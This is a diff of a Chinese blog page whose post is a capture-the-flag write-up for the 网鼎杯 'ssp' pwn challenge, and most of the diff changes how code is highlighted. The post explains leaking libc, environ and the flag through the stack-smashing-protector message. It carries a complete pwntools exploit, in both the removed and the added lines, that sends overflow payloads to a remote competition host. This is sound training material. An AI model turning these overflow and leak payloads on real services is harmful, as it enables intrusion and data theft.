@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="网鼎杯第一场 ssp wp​    首先考虑利用ssp进行泄露，由于flag在栈上，直接写循环leak爆破栈地址，失败，之后考虑爆破canary，爆破失败，而且由于只进行三次fork，所以之后内存数据会更新导致无法进一步泄露，所以放弃爆破canary的思路。">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -317,37 +317,9 @@
     <div class="post-body" itemprop="articleBody">
         <h1 id="网鼎杯第一场-ssp-wp"><a href="#网鼎杯第一场-ssp-wp" class="headerlink" title="网鼎杯第一场 ssp wp"></a>网鼎杯第一场 ssp wp</h1><p>​    首先考虑利用ssp进行泄露，由于flag在栈上，直接写循环leak爆破栈地址，失败，之后考虑爆破canary，爆破失败，而且由于只进行三次fork，所以之后内存数据会更新导致无法进一步泄露，所以放弃爆破canary的思路。<a id="more"></a>之后重新考虑ssp，利用ssp泄露libc函数，然后查找得到libc库，之后能得到libc.environ，泄露libc.environ中保存的地址后，gdb调试一下得到buf偏移，计算得到buf真实地址，最后一次输入淹没泄露buf内容,脚本写的太烂，就不放上来了。</p>
 <p>exp如下：</p>
-<pre><code>#encoding=utf-8
-from pwn import *
-leaksome={&#39;leak&#39;:0}
-p = remote(&#39;106.75.90.160&#39;, 9999)
-pop_rdi_ret=0x0000000000400c13
-strcmp_got=0x00000602050
-gets_plt=0x000000000400830
-payload=&#39;a&#39;*0x128
-payload+=p64(0x000000602048)
-p.recvuntil(&#39;r guessing flag&#39;)
-p.sendline(payload)
-p.recvuntil(&#39;detected ***: &#39;)
-leak=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
-leaksome[&#39;leak&#39;]=leak
-libc_base=leak-0x20740
-env_addr=libc_base+0x00000000003c6f38
-payload=&#39;a&#39;*0x128
-payload+=p64(env_addr)
-p.recvuntil(&#39;r guessing flag&#39;)
-p.sendline(payload)
-p.recvuntil(&#39;detected ***: &#39;)
-leak=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
-leaksome[&#39;leak2&#39;]=leak
-stack_addr=leak
-payload=&#39;a&#39;*0x128
-payload+=p64(stack_addr-0x168)
-p.recvuntil(&#39;r guessing flag&#39;)
-p.sendline(payload)
-p.recvuntil(&#39;detected ***: &#39;)
-print p.recv(1024)
-</code></pre>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">leaksome=&#123;<span class="string">'leak'</span>:0&#125;</span><br><span class="line">p = remote(<span class="string">'106.75.90.160'</span>, 9999)</span><br><span class="line"><span class="attribute">pop_rdi_ret</span>=0x0000000000400c13</span><br><span class="line"><span class="attribute">strcmp_got</span>=0x00000602050</span><br><span class="line"><span class="attribute">gets_plt</span>=0x000000000400830</span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*0x128</span><br><span class="line">payload+=p64(0x000000602048)</span><br><span class="line">p.recvuntil(<span class="string">'r guessing flag'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line"><span class="attribute">leak</span>=u64(p.recv(6).ljust(8,'\x00'))</span><br><span class="line">leaksome[<span class="string">'leak'</span>]=leak</span><br><span class="line"><span class="attribute">libc_base</span>=leak-0x20740</span><br><span class="line"><span class="attribute">env_addr</span>=libc_base+0x00000000003c6f38</span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*0x128</span><br><span class="line">payload+=p64(env_addr)</span><br><span class="line">p.recvuntil(<span class="string">'r guessing flag'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line"><span class="attribute">leak</span>=u64(p.recv(6).ljust(8,'\x00'))</span><br><span class="line">leaksome[<span class="string">'leak2'</span>]=leak</span><br><span class="line"><span class="attribute">stack_addr</span>=leak</span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*0x128</span><br><span class="line">payload+=p64(stack_addr-0x168)</span><br><span class="line">p.recvuntil(<span class="string">'r guessing flag'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line"><span class="builtin-name">print</span> p.recv(1024)</span><br></pre></td></tr></table></figure>
+
+
     </div>
 
     
@@ -452,8 +424,6 @@ print p.recv(1024)
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
